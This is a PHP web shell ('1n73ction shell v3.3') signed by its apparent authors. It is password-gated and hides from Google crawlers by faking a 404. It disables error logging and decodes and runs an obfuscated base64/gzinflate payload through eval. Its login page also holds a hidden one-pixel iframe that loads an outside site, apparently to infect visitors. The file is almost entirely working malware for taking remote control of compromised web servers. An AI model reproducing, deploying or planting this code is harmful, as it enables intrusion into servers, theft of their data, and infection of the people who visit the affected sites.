<?php
/* (1n73ction shell v3.3 by x'1n73ct | default pass:" 1n73ction ") */ 
$auth_pass = "9c80a1eaca699e2fc6b994721f8703bc"; 
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@ini_set('file_uploads',1);
@set_time_limit(0); 
@set_magic_quotes_runtime(0);
@clearstatcache(); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
 ?><body><style>
    body { background-color:transparan;background:#000;background-image: url("https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-snc7/312433_115240901993648_1448557871_n.jpg");background-position: center;    background-attachment: fixed;background-repeat: no-repeat; } 
	.tabnez{ margin:30px auto 0 auto;border: 1px solid #333333; color: #00ff00; 
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;}
	body,td,th {font-family: Verdana;font-size: 12px;color: #00FF00;font-weight: bold;}
	input {BORDER-RIGHT:#00FF00 1px solid;BORDER-TOP:#00FF00 1px solid;BORDER-LEFT:#00FF00 1px solid;BORDER-BOTTOM: #00FF00 1px solid;BACKGROUND-COLOR: #111111;COLOR: #00FF00;font: 8pt Verdana;}
    </style>
    <center><br><br><table class=tabnez>
    <form method=post><tr><td><img src='http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png' height='20' width='24'></td><td>
    <input type=password name=pass></td></tr> 
    </form></table></center>
	<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
/* cyber173 enc0de */ if((preg_match(base64_decode('L2V2YWwvCg=='),file_get_contents(__FILE__)))&&(function_exists(soundex('cyber173_decode')))){define("\x43\x59\x42\x45\x52\x31\x37\x33", "ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgnCg==");define("\x57\x61\x73", "jVDPS8MwFL4P+j/kUGgKZUUQD4Yh`qycedErdvJYsfV2`dMSl9r3M49r+bthadBzGX5H2/3ke`cSdlaRdpZtt8C8bBtTHwIC0m`szZjyU66tJh6L/o1Arvaqjk/Y9Tq7f3xa5dlitc6`wq2y+fL5dZAk7+1Ptr4T1e0R`ySdRmXAR7UIP4y6+MQxiRBqhtL`bss4hicFsdfzUttIPd4rpwlsCMv2BjT6U5TupWDih10yfjI+F4afU`dUd9pBgx6MYq+CnTR8+6FtaS`qB30iEi/O8AOUK4N/f6Y84gk`h4hwN/WHy7oVRUEdWXa`vpLJNhoO1XuLS3cuz`vOFtO6qq/07AXnr3f4cBPFIph8`ag==");define("\x48\x65\x72\x65", "JykpKTsK");}function C163($Ox31,$Ox32,$Ox33){return base64_decode($Ox31).preg_replace_callback(urldecode('%7E%60%28%5B%61%2D%7A%5D%29%7E'),function($alpha){return strtoupper($alpha[1]);},$Ox32).base64_decode($Ox33);}class cyber173{function cyber173_encode(){$is = 'cyber173_code';$this->$is(eval(C163(CYBER173,Was,Here)));}function cyber173_code($x){return $x;}}$cyber173_encode = new cyber173();$cyber173_decode = "cyber173_encode";$cyber173_encode->$cyber173_decode();
/* tanks for: Mr_GanDrunX | Hidden-name Corps | IFC | IBC | BNT | SBH | AnonGhost | Devilz c0de | Jasakom | cyberdark */
/* by X-1N73CT a.k.a cyber173 & S1T1 B4RC0D3*/
?>